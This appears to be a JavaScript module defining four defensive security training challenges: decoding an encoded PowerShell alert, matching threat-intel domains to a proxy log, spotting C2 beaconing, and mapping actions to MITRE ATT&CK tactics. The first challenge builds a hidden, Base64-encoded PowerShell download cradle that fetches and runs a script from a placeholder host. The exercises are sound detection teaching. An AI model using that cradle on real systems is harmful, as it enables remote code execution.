// Track: Threats & Detection. Spot attacker behaviour in captures, logs and alerts.
// Analysis-focused: learners read artefacts and identify indicators.
import * as C from "../tools/crypto.js";
import { norm } from "../flags.js";

export default [
  {
    id: "threats-encoded-cmd",
    title: "The Encoded Command",
    level: 2,
    slug: "decode_the_payload_alert",
    time: 9,
    certs: ["Security+", "CySA+", "CEH"],
    objective: "An endpoint alert caught a suspicious encoded command. Decode it to see what it does and recover the flag.",
    lesson: `Attackers hide the commands they run so that a glance at the logs reveals nothing. A favourite trick on Windows is the **encoded command**: a tool is launched with a Base64 blob instead of readable text.

\`\`\`
powershell.exe -enc aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoA...
\`\`\`

To a human skimming logs it's gibberish — which is the point. But to a defender it's trivial: the \`-enc\` / \`-EncodedCommand\` flag means the rest is just Base64. Decode it and the real command appears, often downloading and running a second payload.

This is **defensive** work: decoding what an alert captured so you understand what the attacker tried to do.

### Your task
Open the alert, copy the Base64 after \`-enc\`, and decode it in the **Toolkit** (Base64 → text). The decoded command contains the flag.`,
    hints: ["The string after -enc is Base64. Copy just that part.", "Toolkit → Base64 → text. The decoded command reveals the attacker's intent and the flag."],
    workspace: { type: "files" },
    setup(ctx) {
      const inner = `IEX (New-Object Net.WebClient).DownloadString('http://${ctx.word()}-cdn.example/${ctx.hex(6)}.ps1'); # tag:${ctx.flag}`;
      const enc = C.b64encode(inner);
      const log = [
        `[EDR ALERT] severity=HIGH host=FINANCE-07 user=mwells`,
        `rule: Suspicious encoded interpreter invocation`,
        `process: powershell.exe`,
        `cmdline: powershell.exe -nop -w hidden -enc ${enc}`,
        `parent: winword.exe`,
        `action: BLOCKED`,
      ].join("\n");
      return { files: [{ name: "edr_alert.txt", kind: "text", note: "A high-severity endpoint alert. Decode what the command actually does.", data: log }] };
    },
    debrief: `The \`-enc\` blob decoded to a one-liner that downloads and runs a remote script — a classic **download cradle**, launched from Word (\`winword.exe\` as the parent process is a huge red flag for a malicious macro).

### How defenders stop it
- Alert on \`-enc\`/\`-EncodedCommand\` and on interpreters spawned by Office apps.
- Enable PowerShell **script-block logging**, which records the decoded command automatically.
- Block macros from the internet and use application control.

**On the exam:** decoding encoded commands and recognising suspicious parent-child process chains are core CySA+ and CEH analysis skills.`,
  },

  {
    id: "threats-ioc",
    title: "Match the Indicator",
    level: 2,
    slug: "indicators_of_compromise",
    time: 10,
    certs: ["Security+", "CySA+", "GSEC"],
    objective: "Threat intel gave you a watchlist of known-bad domains. One appears in the proxy log. Submit that domain.",
    answerLabel: "Malicious domain",
    answerPlaceholder: "e.g. bad.example.com",
    lesson: `An **Indicator of Compromise (IOC)** is a specific, observable sign that a system may be breached: a known-bad IP, domain, file hash, or URL. Threat-intelligence feeds publish lists of them, and defenders **match** those lists against their own logs to spot intrusions.

The workflow is simple and powerful: take a watchlist of bad indicators, search your proxy, DNS or firewall logs for any of them, and investigate every hit.

### Your task
You have two files: a **watchlist** of known-malicious domains, and a **proxy log** of sites your users visited. Find the one domain that appears in **both**. The proxy log has a filter box to help.`,
    hints: ["Open both files. The watchlist is short; scan the proxy log for each entry.", "Use the proxy log's filter box to search for suspicious-looking domains from the watchlist.", "Exactly one watchlist domain appears in the proxy log — that's the compromise."],
    workspace: { type: "files" },
    setup(ctx) {
      const bad = `${ctx.word()}-${ctx.hex(3)}.top`;
      const otherBad = [`login-${ctx.word()}.ru`, `${ctx.word()}update.cc`, `cdn-${ctx.hex(4)}.xyz`, `${ctx.word()}-secure.info`];
      const normal = ["cdn.jsdelivr.net", "fonts.googleapis.com", "github.com", "api.weather.com", "outlook.office365.com", "update.microsoft.com", "slack.com", "zoom.us"];
      const log = [];
      let h = 9, m = 0;
      const ts = () => { m += ctx.int(1, 4); if (m >= 60) { m -= 60; h++; } return `09:${String(m).padStart(2, "0")}`; };
      void h;
      for (let i = 0; i < 40; i++) log.push(`${ts()} 10.0.3.${ctx.int(10, 90)} GET https://${ctx.pick(normal)}/`);
      // insert the one real hit
      log.splice(ctx.int(5, 34), 0, `${ts()} 10.0.3.${ctx.int(10, 90)} GET https://${bad}/${ctx.hex(5)}`);
      return {
        _bad: bad,
        files: [
          { name: "threat-intel-watchlist.txt", kind: "text", note: "Known-malicious domains from today's intel feed.", data: [bad, ...otherBad].sort().join("\n") },
          { name: "proxy.log", kind: "log", note: "Outbound web requests seen by the proxy. Find a watchlist hit.", data: log.join("\n") },
        ],
      };
    },
    check(input, ctx, env) {
      return norm.text(input).replace(/^https?:\/\//, "").replace(/\/.*$/, "") === env._bad;
    },
    debrief: `One watchlist domain showed up in the proxy log — a host reaching out to known-bad infrastructure, the sign of a likely compromise. Matching IOCs against logs is the daily bread of a SOC.

### How defenders stop it
- Automate IOC matching in a **SIEM**; feed it threat-intel so hits alert in real time.
- Remember IOCs are **reactive** — they catch known-bad only. Pair them with behaviour-based detection for novel threats.
- Track indicators up the **Pyramid of Pain**: blocking tools and TTPs hurts attackers more than blocking a single IP.

**On the exam:** IOCs, threat-intel feeds and log matching are central to CySA+ and appear in Security+.`,
  },

  {
    id: "threats-beacon",
    title: "The Steady Heartbeat",
    level: 3,
    slug: "c2_beaconing_interval",
    time: 12,
    certs: ["CySA+", "CEH", "Network+"],
    objective: "Malware on the network is phoning home at a fixed interval. Identify the external IP it's beaconing to.",
    answerLabel: "C2 server IP",
    answerPlaceholder: "e.g. 198.51.100.23",
    lesson: `Once malware lands, it usually "calls home" to a **command-and-control (C2)** server for instructions. To stay reliable it checks in on a schedule — a **beacon**. That regularity is also its weakness.

Normal web browsing is bursty and irregular. A beacon is the opposite: the same internal host contacting the same external address at a **near-constant interval** (every 30s, every 60s), often with small, similar-sized requests. Plot the timing and the heartbeat jumps out.

### Your task
In the capture, find the external IP that one internal host contacts again and again at an even spacing. The other traffic is ordinary and irregular. Submit the **external** IP being beaconed to.`,
    hints: ["Look for one destination IP that repeats at a regular time interval, unlike normal bursty traffic.", "Filter to that conversation and check the Time column — a fixed gap between requests is the beacon.", "Submit the external server IP (not the internal 10.x host)."],
    workspace: { type: "pcap" },
    setup(ctx) {
      const victim = `10.0.6.${ctx.int(20, 60)}`;
      const c2 = `198.51.100.${ctx.int(5, 250)}`;
      const normals = ["93.184.216.34", "140.82.113.4", "151.101.1.69", "104.16.132.229"];
      const packets = [];
      // beacon: every ~30s, tight jitter
      let t = 2.0;
      for (let i = 0; i < 10; i++) {
        packets.push({ t: +t.toFixed(2), src: victim, dst: c2, proto: "TLS", sport: 49200 + i, dport: 443, info: "Application Data (GET /api/poll)", data: "GET /api/poll" });
        packets.push({ t: +(t + 0.08).toFixed(2), src: c2, dst: victim, proto: "TLS", sport: 443, dport: 49200 + i, info: "Application Data", data: "204 No Content" });
        t += 30 + (ctx.rng() - 0.5) * 1.2;
      }
      // normal irregular browsing interleaved
      let nt = 1.0;
      for (let i = 0; i < 24; i++) {
        nt += ctx.rng() * 18;
        const ip = ctx.pick(normals);
        packets.push({ t: +nt.toFixed(2), src: victim, dst: ip, proto: "TLS", sport: 50000 + i, dport: 443, info: "Application Data", data: "GET /" });
      }
      packets.sort((a, b) => a.t - b.t);
      return { _c2: c2, packets };
    },
    check(input, ctx, env) {
      return norm.ip(input) === env._c2;
    },
    debrief: `One host contacted an external IP every ~30 seconds, like clockwork, while real browsing stayed irregular — textbook **C2 beaconing**. Even over TLS (so the content is hidden), the *timing* gave it away.

### How defenders stop it
- Detect beaconing by analysing **inter-arrival times** and connection regularity (tools like RITA, and most NDR platforms).
- Correlate with destination reputation and rare JA3/TLS fingerprints.
- Beacon jitter and "domain fronting" try to evade this, so defenders look at many signals together.

**On the exam:** beaconing and C2 detection are named CySA+ and CEH topics (MITRE ATT&CK TA0011).`,
  },

  {
    id: "threats-attack-map",
    title: "Name the Tactic",
    level: 3,
    slug: "mitre_attack_tactics",
    time: 10,
    certs: ["CySA+", "CEH", "CISSP"],
    objective: "Read the observed attacker action and name the MITRE ATT&CK tactic it belongs to.",
    answerLabel: "ATT&CK tactic",
    answerPlaceholder: "e.g. Persistence",
    lesson: `**MITRE ATT&CK** is a shared language for describing attacker behaviour. It organises real techniques into **tactics** — the attacker's *goal* at each step:

- **Initial Access** — getting in (phishing, exploiting a public app).
- **Execution** — running malicious code.
- **Persistence** — keeping access across reboots (scheduled tasks, new services, registry run keys).
- **Privilege Escalation** — gaining higher permissions.
- **Defense Evasion** — avoiding detection (clearing logs, disabling tools).
- **Credential Access** — stealing passwords/hashes.
- **Lateral Movement** — spreading to other hosts.
- **Exfiltration** — stealing data out.

Mapping what you see to a tactic turns scattered alerts into a coherent story and drives the right response.

### Your task
Read the single observed action in the file and answer with the **tactic** it best represents (one of the names above).`,
    hints: ["Ask what the attacker was trying to achieve with this action, not how they did it.", "Creating a scheduled task to re-launch malware after reboot is about keeping access. Dumping password hashes is about stealing credentials."],
    workspace: { type: "files" },
    setup(ctx) {
      const cases = [
        { a: "persistence", keys: ["persistence"], text: "Observed: the malware created a scheduled task named 'SystemUpdate' set to run its payload every time the machine boots." },
        { a: "credential access", keys: ["credential"], text: "Observed: the process accessed LSASS memory and dumped it to disk, a technique used to extract cached passwords and hashes." },
        { a: "exfiltration", keys: ["exfil"], text: "Observed: 2.3 GB of compressed files were uploaded from an internal host to an unfamiliar external cloud-storage account overnight." },
        { a: "defense evasion", keys: ["defense evasion", "defence evasion", "evasion"], text: "Observed: the attacker cleared the Windows Security event log and disabled the antivirus service right after gaining access." },
        { a: "lateral movement", keys: ["lateral"], text: "Observed: using stolen admin credentials, the attacker opened remote SMB sessions to five other workstations and copied a tool to each." },
      ];
      const pick = cases[ctx.int(0, cases.length - 1)];
      return { _keys: pick.keys, files: [{ name: "observation.txt", kind: "text", note: "A single observed attacker action. Which ATT&CK tactic is it?", data: pick.text + "\n\nAnswer with the MITRE ATT&CK tactic name." }] };
    },
    check(input, ctx, env) {
      const v = norm.text(input);
      return env._keys.some((k) => v.includes(k));
    },
    debrief: `You mapped a raw observation to an ATT&CK **tactic** — the attacker's objective at that moment. Chaining these across an incident reconstructs the whole **kill chain** and shows what the adversary was after.

### How defenders stop it
- Use ATT&CK to measure detection **coverage** (which tactics/techniques you can actually catch) and close gaps.
- Tag alerts with ATT&CK IDs so responders instantly grasp the stage and likely next move.
- Threat-hunt proactively for high-impact techniques (credential dumping, persistence).

**On the exam:** ATT&CK tactics and the cyber kill chain are tested in CySA+ and CEH, and feature in CISSP's security-operations domain.`,
  },
];
